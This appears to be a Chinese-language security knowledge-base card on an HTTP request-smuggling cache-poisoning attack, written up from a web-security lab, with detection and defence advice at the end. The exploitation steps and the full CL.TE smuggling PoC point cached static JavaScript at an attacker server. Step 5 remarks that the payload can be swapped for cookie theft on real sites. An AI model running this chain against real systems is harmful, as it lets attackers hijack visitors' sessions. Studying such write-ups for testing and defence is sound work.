---
id: web-generic-cache-poisoning-smuggling-redirect-static-asset
title: 请求走私缓存投毒：把带攻击者 Host 的 301 藏进后端请求，前端按下一请求 URL 缓存重定向，静态 JS 请求被导向利用服务器
type: scenario
domain: web
path: web/generic/cache-poisoning
technique: request-smuggling-cache-poisoning-redirect
tags:
- http-smuggling
- cache-poisoning
- open-redirect
- host-header
- javascript
- cl-te
- http1
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V614
  verified_at: '2026-11-12T20:50:53+08:00'
  notes: '已对照原文『缓存投毒』节正文核对（该节 9 张截图为 xzfile.aliyuncs.com 外链，本地未下载，重试下载返回 403，无法读图）：走私 GET /post/next?postId=3 + Host: <exploit-server> + CL 10 + x=1，外层 CL 193；利用服务器 /post 托管 alert(document.cookie)；前端按下一请求 URL 缓存 301，后续静态 JS 请求被重定向。参数与原文一致；已修正原卡『脚本在受害者站点上下文之外加载？』的含糊表述为：脚本资源来自攻击者域但仍在受害者页面上下文执行。未验证点：缺该节截图，仅正文核对；未本机复跑；无 sources；无版本/CVE。dedup：与 H2 tunnelling cache-poisoning（H2 混入外层 HTML）、host-header-ambiguous（直接 Host 投毒）不同链，保留。'
url: /docs/web/generic/cache-poisoning/web-generic-cache-poisoning-smuggling-redirect-static-asset/
draft: false
kb_aliases:
- 走私缓存投毒
- smuggling cache poisoning
- 重定向缓存投毒
- 静态资源 301 投毒
- JavaScript 缓存投毒
---

## 一句话结论

利用请求走私让后端对带攻击者 `Host` 的请求返回 301，前端却按"它认为是第二个请求"的 URL 缓存该响应；于是对某个静态 JS 文件的后续请求命中缓存，收到指向攻击者服务器的重定向，攻击者在该服务器提供 `alert(document.cookie)` 即可让全站访客执行脚本。

## 原理

- 前端缓存按请求 URL 存储响应；请求走私使后端对"第二个请求"生成响应时，前端把该响应归属到它看到的"下一个请求"的 URL 上。
- 攻击者先走私一个 `GET /post/next?postId=3`，并带 `Host: attacker-exploit-server`；后端基于 Host 生成 301，`Location` 指向攻击者服务器；前端把这个 301 缓存到它认为的下一请求 URL（如静态 JS 路径）。
- 之后任何用户请求该静态 JS URL，前端直接返回缓存的 301，浏览器跟随跳转到攻击者服务器，以 `text/javascript` 取回 `alert(document.cookie)`；脚本资源虽来自攻击者域，但仍在受害者页面上下文中执行，因此可读取该站点的 `document.cookie`（实验室以弹 Cookie 为解）。
- 为什么成立：缓存键只取前端看到的 URL，而后端响应内容由走私请求决定；两者语义错位让攻击者能把"带外部 Location 的 301"绑定到任意可缓存 URL 上。
- 与普通缓存投毒的区别：投毒输入不是缓存键中的头/参数，而是来自后端连接上的走私请求，前端完全看不到攻击内容。

## 触发条件

- 存在请求走私原语（CL.TE 等），前后端复用连接。
- 前端配置了 Web 缓存，且会缓存重定向/特定静态资源响应。
- 后端对目录或特定路径基于 Host 生成 301。
- 攻击者有一个可控的利用服务器，可托管 JS 或接收跳转。
- 目标存在会被浏览器加载的静态 JS 资源路径。

## 利用步骤

1. 观察站点静态资源（如 `/resources/js/...`）与缓存行为，确认哪些响应会被缓存。
2. 在利用服务器准备 payload 文件（如 `/post` 返回 `alert(document.cookie)`，Content-Type 为 `text/javascript`）。
3. 构造走私请求：`GET /post/next?postId=3 HTTP/1.1` + `Host: <exploit-server>` + `Content-Type` + `Content-Length: 10` + `x=1`，用 CL.TE 封装；发送多次以命中缓存写入。
4. 检查目标静态 JS URL 的响应是否变成 301 到利用服务器；若命中，受害者加载该 JS 时即执行攻击者脚本。
5. 在实验环境提交完成；真实环境可把 payload 换成窃取 Cookie/发起请求的脚本。

## PoC

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

利用服务器上托管：

```text
alert(document.cookie)
```

说明：走私请求让后端基于攻击者 Host 生成 301，前端按下一请求 URL 缓存；随后对静态 JS 的请求命中该重定向。原文靶场以弹 Cookie 为解。PoC 为靶场流程的结构化复现，未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：把目标 URL 换成任意可缓存路径（CSS、图片、JS）；把 301 换成 302；把 payload 换成持久化 XSS/钓鱼页。
- 变体：与缓存欺骗结合，把私有响应写入缓存；或与 Host 头缓存投毒组合扩大命中面。
- 关联：[[web-generic-open-redirect-smuggled-host-header-301]]（重定向原语）、[[web-generic-http-smuggling-h2-request-tunnelling-cache-poisoning-xss]]（不同机制但同目标的缓存投毒 XSS）、[[web-generic-cache-poisoning-host-header-ambiguous-request]]（Host 头缓存投毒）、[[web-generic-cache-poisoning-smuggling-private-response-deception]]（同用走私写入缓存的另一目标）。
- 边界：前端不缓存重定向、缓存键包含 Host/完整头、或走私原语不可用时，本链不成立。

## 检测与防御

- 检测：缓存中出现指向外部域的 301；静态资源响应状态码异常（301/302）；同一 URL 的响应体与 Content-Type 不符；前端日志只有正常请求而后端出现异常 Host。
- 防御：缓存层不缓存带外部 Location 的重定向或对 Location 做同域校验；服务器重定向使用固定规范域名；拒绝 CL+TE 并存；前端重新序列化请求；禁用后端连接复用。
- 加固：缓存键纳入 Host 与实际响应类型；对静态资源使用内容哈希 URL；部署缓存投毒/desync 检测与监控。
